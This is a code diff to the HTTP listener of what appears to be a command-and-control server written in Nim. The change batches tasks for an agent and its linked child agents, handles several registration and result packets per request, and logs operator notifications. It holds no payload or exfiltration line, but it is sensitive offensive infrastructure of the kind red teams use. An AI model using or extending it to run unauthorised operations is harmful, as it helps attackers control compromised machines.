@@ -1,10 +1,11 @@
 import mummy, terminal
-import strutils, strformat
+import strutils, strformat, tables
 
 import ./handlers
 import ../globals
 import ../core/[logger, websocket]
-import ../../common/[types, utils, serialize, profile]
+import ../../common/[utils, serialize, profile]
+import ../../types/[common, server]
 
 # Not Found
 proc error404*(request: Request) =  
@@ -62,19 +63,24 @@ proc httpGet*(request: Request) =
 
         try: 
             var responseBytes: seq[byte]
-            let (agentId, tasks) = getTasks(heartbeat)
+            let tasks = getTasks(heartbeat)
 
             if tasks.len <= 0: 
                 request.respond(200, body = "")
                 return
 
-            # Create response, containing number of tasks, as well as length and content of each task
-            # This makes it easier for the agent to parse the tasks
-            responseBytes.add(cast[uint8](tasks.len))
+            # Return tasks for agent and linked children
+            for agentId, tasks in tasks: 
+                responseBytes.add(uint32.toBytes(string.toUuid(agentId)))           # 4 bytes agent ID
+                responseBytes.add(cast[uint8](tasks.len()))                         # 1 byte number of tasks for agent
 
-            for task in tasks:
-                responseBytes.add(uint32.toBytes(uint32(task.len))) 
-                responseBytes.add(task)
+                for task in tasks:
+                    responseBytes.add(uint32.toBytes(uint32(task.len)))             # 4 bytes length of task 
+                    responseBytes.add(task)                                         # variable length task
+                
+                # Notify operator that agent collected tasks
+                cq.sendConsoleItem(agentId, LOG_INFO, fmt"{$responseBytes.len} bytes sent.") # Always send this message (even when silent/browser tasks are collected)
+                cq.info(fmt"{$responseBytes.len} bytes sent.")
             
             # Apply data transformation to the response
             let payload = cq.profile.applyDataTransformation("http-get.server.output", responseBytes)
@@ -86,11 +92,8 @@ proc httpGet*(request: Request) =
 
             request.respond(200, headers = headers, body = payload)
 
-            # Notify operator that agent collected tasks
-            cq.client.sendConsoleItem(agentId, LOG_INFO, fmt"{$responseBytes.len} bytes sent.")
-            cq.info(fmt"{$responseBytes.len} bytes sent.")
-
         except CatchableError as err:
+            cq.error(err.msg)
             request.respond(404, body = "")
 
 #[
@@ -134,15 +137,21 @@ proc httpPost*(request: Request) =
 
             # Differentiate between registration and task result packet
             var unpacker = Unpacker.init(Bytes.toString(data))
-            let header = unpacker.deserializeHeader()
-            if cast[PacketType](header.packetType) == MSG_REGISTER: 
-                if not register(data, request.remoteAddress):
-                    request.respond(400, body = "")
-                    return
+            let packetCount = unpacker.getUint8()
+            
+            for i in 0 ..< int(packetCount): 
+                let data = unpacker.getDataWithLengthPrefix()
+                let dataUnpacker = Unpacker.init(data)
+                let header = dataUnpacker.deserializeHeader()
 
-            elif cast[PacketType](header.packetType) == MSG_RESULT: 
-                handleResult(data)
+                if cast[PacketType](header.packetType) == MSG_REGISTER: 
+                    if not register(string.toBytes(data), request.remoteAddress):
+                        request.respond(400, body = "")
+                        return
 
+                elif cast[PacketType](header.packetType) == MSG_RESULT: 
+                    handleResult(string.toBytes(data))
+                
             request.respond(200, body = cq.profile.getString("http-post.server.output.body"))
 
         except CatchableError:
